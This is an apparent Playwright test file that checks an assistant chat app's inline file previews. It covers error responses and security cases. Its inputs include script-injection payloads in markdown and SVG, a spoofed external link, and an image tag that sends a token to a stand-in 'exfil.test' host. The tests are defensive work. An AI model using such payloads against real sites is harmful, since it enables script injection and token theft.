import { test, expect } from '../../fixtures/test-context'
import { loginAsAdmin } from '../../common/auth-helpers'
import {
  createProviderViaAPI,
  createModelViaAPI,
  assignProviderToAdministratorsGroup,
} from '../../common/provider-helpers'
import {
  seedAssistantWithToolResult,
  mockResourceLinkUrl,
} from './fixtures/mock-tool-result'

/**
 * Error + security paths. Each test asserts that the preview
 * degrades gracefully and that potentially-hostile content cannot
 * exfiltrate or escape its bubble.
 */

test.describe('Inline file previews — error + security paths', () => {
  test.beforeEach(async ({ page, testInfra }) => {
    const { baseURL, apiURL } = testInfra
    await loginAsAdmin(page, baseURL)
    const token = await page.evaluate(() =>
      JSON.parse(localStorage.getItem('auth-storage')!).state.token,
    )
    const providerId = await createProviderViaAPI(apiURL, token, 'OpenAI', 'openai')
    await assignProviderToAdministratorsGroup(apiURL, token, providerId)
    await createModelViaAPI(apiURL, token, providerId, undefined, undefined, 'openai')
  })

  test('URL returns 404 for text viewer → inline error message', async ({
    page,
    testInfra,
  }) => {
    const uri = '/api/files/err-404/download'
    await mockResourceLinkUrl(page, uri, 'not found', { status: 404 })
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'gone.md', mime_type: 'text/markdown' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    await expect(body).toContainText(/failed to load/i, { timeout: 10000 })
  })

  test('URL returns 403 for text viewer → inline error message', async ({
    page,
    testInfra,
  }) => {
    const uri = '/api/files/err-403/download'
    await mockResourceLinkUrl(page, uri, 'forbidden', { status: 403 })
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'denied.md', mime_type: 'text/markdown' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    await expect(body).toContainText(/failed to load/i, { timeout: 10000 })
  })

  test('URL returns 500 → inline error, no React error boundary', async ({
    page,
    testInfra,
  }) => {
    const pageErrors: string[] = []
    page.on('pageerror', e => pageErrors.push(e.message))
    const uri = '/api/files/err-500/download'
    await mockResourceLinkUrl(page, uri, 'oops', { status: 500 })
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'bad.md', mime_type: 'text/markdown' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    await expect(body).toContainText(/failed to load/i, { timeout: 10000 })
    expect(pageErrors).toEqual([])
  })

  test('image URL 404 shows friendly placeholder, no React error boundary', async ({
    page,
    testInfra,
  }) => {
    // ImageBody intentionally renders a "Couldn't load image" placeholder
    // when the <img>'s onError fires — avoids exposing the browser's
    // broken-image icon. Test pins (a) the friendly fallback renders and
    // (b) no React error boundary fires.
    const pageErrors: string[] = []
    page.on('pageerror', e => pageErrors.push(e.message))
    const uri = '/api/files/err-img-404/download'
    await mockResourceLinkUrl(page, uri, 'not found', { status: 404 })
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'p.png', mime_type: 'image/png' }],
    })
    const fallback = page
      .locator('[data-testid="inline-file-preview-image-error"]')
      .first()
    await expect(fallback).toBeVisible({ timeout: 10000 })
    await expect(fallback).toContainText(/couldn.?t load image/i)
    expect(pageErrors).toEqual([])
  })

  test('URL returns wrong MIME (text viewer fetches binary-looking bytes) does not crash', async ({
    page,
    testInfra,
  }) => {
    const pageErrors: string[] = []
    page.on('pageerror', e => pageErrors.push(e.message))
    const uri = '/api/files/err-wrong-mime/download'
    // Server says text/plain but body is binary-ish PNG header.
    await mockResourceLinkUrl(page, uri, '\x89PNG\r\n\x1a\nGARBLED', { contentType: 'text/plain' })
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'odd.txt', mime_type: 'text/plain' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    // RawCodeView uses `.whitespace-pre` divs, not a `<pre>` element.
    await expect(body.locator('.whitespace-pre').first()).toBeVisible({ timeout: 10000 })
    expect(pageErrors).toEqual([])
  })

  test('absolute URL outside /api is refused at fetch time (text viewer)', async ({
    page,
    testInfra,
  }) => {
    // The dispatcher still rounds-trips the link to a viewer (the
    // matching is MIME-based, not URL-based), but the
    // useResourceLinkContent hook refuses to fetch non-`/api/` URLs.
    // For the text viewer that means an immediate error sentinel.
    const uri = 'https://evil.example.com/spoofed.md'
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'evil.md', mime_type: 'text/markdown' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    await expect(body).toContainText(/failed to load/i, { timeout: 10000 })
  })

  test('markdown content with raw <script> tag does not execute (no rehype-raw)', async ({
    page,
    testInfra,
  }) => {
    await page.addInitScript(() => {
      ;(window as any).MD_XSS = false
    })
    const uri = '/api/files/err-md-xss/download'
    await mockResourceLinkUrl(
      page,
      uri,
      'Hello\n\n<script>window.MD_XSS = true</script>\n\nWorld\n',
      { contentType: 'text/markdown' },
    )
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'xss.md', mime_type: 'text/markdown' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    await expect(body).toContainText('Hello', { timeout: 10000 })
    const pwned = await page.evaluate(() => (window as any).MD_XSS)
    expect(pwned).toBe(false)
  })

  test.fixme(
    'markdown content with HTML <img src=external> does not exfiltrate',
    async ({ page, testInfra }) => {
    // KNOWN LIMITATION: Streamdown 2's default `allowedImagePrefixes: ['*']`
    // permits external image src in raw-HTML <img> tags inside fetched
    // markdown. Neither `urlTransform` nor `components.img` overrides
    // intercept this — both apply only to markdown-syntax `![](url)`
    // images. The fix requires either:
    //   - installing `rehype-harden` directly + passing custom
    //     `rehypePlugins` with `allowedImagePrefixes: ['/api/']`, or
    //   - shipping a CSP `img-src 'self' data:` meta tag (browser-level
    //     guarantee, broader app impact).
    // Both are deliberate scope additions; pinned with .fixme so the
    // issue stays visible. Upstream: https://github.com/vercel/streamdown/issues/343
    // Spy on requests to the exfil domain.
    const exfilHits: string[] = []
    await page.route(/^https:\/\/exfil\.test\//, async route => {
      exfilHits.push(route.request().url())
      await route.fulfill({ status: 200, body: '' })
    })
    const uri = '/api/files/err-md-exfil/download'
    await mockResourceLinkUrl(
      page,
      uri,
      'Header\n\n<img src="https://exfil.test/?token=secret" />\n',
      { contentType: 'text/markdown' },
    )
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'exfil.md', mime_type: 'text/markdown' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    await expect(body).toContainText('Header', { timeout: 10000 })
    // Streamdown's defaults don't run rehype-raw — the raw <img> renders as
    // escaped text, not a live element. Confirms no exfil.
    expect(exfilHits).toEqual([])
  },
  )

  test('SVG resource_link does NOT render inline (script-vector mitigation)', async ({
    page,
    testInfra,
  }) => {
    // image/svg+xml is intentionally claimed by the `web/` viewer
    // (priority-0 exact match overrides image viewer's `image/*`
    // wildcard at priority 10). Web viewer does NOT opt in to inline
    // rendering, so SVG resource_links fall back to a header-only
    // file card with no inline <img>. Any <script> embedded in an SVG
    // therefore cannot execute via the inline-preview path — there's
    // no <img> element loading the SVG. The right-panel viewer for
    // SVG separately sandbox=""s its iframe, so scripts stay inert
    // there too. This test pins the inline-fallback so a future
    // change adding `inline: true` to web/ forces a deliberate
    // security review.
    await page.addInitScript(() => {
      ;(window as any).SVG_XSS = false
    })
    const uri = '/api/files/err-svg/download'
    await mockResourceLinkUrl(
      page,
      uri,
      '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>window.SVG_XSS = true</script></svg>',
      { contentType: 'image/svg+xml' },
    )
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'evil.svg', mime_type: 'image/svg+xml' }],
    })
    const preview = page.locator('[data-testid="inline-file-preview"]').first()
    await expect(preview).toBeVisible({ timeout: 10000 })
    // Inline body MUST NOT render — no <img>, no body div.
    await expect(preview.locator('[data-testid="inline-file-preview-body"]')).toHaveCount(0)
    await expect(preview.locator('img')).toHaveCount(0)
    // Even after a beat, the embedded script never executed.
    await page.waitForTimeout(500)
    expect(await page.evaluate(() => (window as any).SVG_XSS)).toBe(false)
  })

  test('mermaid block (even with malformed syntax) does not crash the page', async ({
    page,
    testInfra,
  }) => {
    // Since the mermaid plugin isn't installed, the rendered output is
    // a styled code-block — the malformed mermaid syntax never reaches
    // a real parser. Test ensures no React error boundary fires.
    const pageErrors: string[] = []
    page.on('pageerror', e => pageErrors.push(e.message))
    const uri = '/api/files/err-mermaid/download'
    await mockResourceLinkUrl(
      page,
      uri,
      '```mermaid\nthis is not valid mermaid syntax {{{\n```\n',
      { contentType: 'text/markdown' },
    )
    await seedAssistantWithToolResult(page, testInfra.baseURL, {
      resourceLinks: [{ uri, name: 'broken.md', mime_type: 'text/markdown' }],
    })
    const body = page
      .locator('[data-testid="inline-file-preview"] [data-testid="inline-file-preview-body"]')
      .first()
    await expect(body).toBeVisible({ timeout: 10000 })
    expect(pageErrors).toEqual([])
  })
})
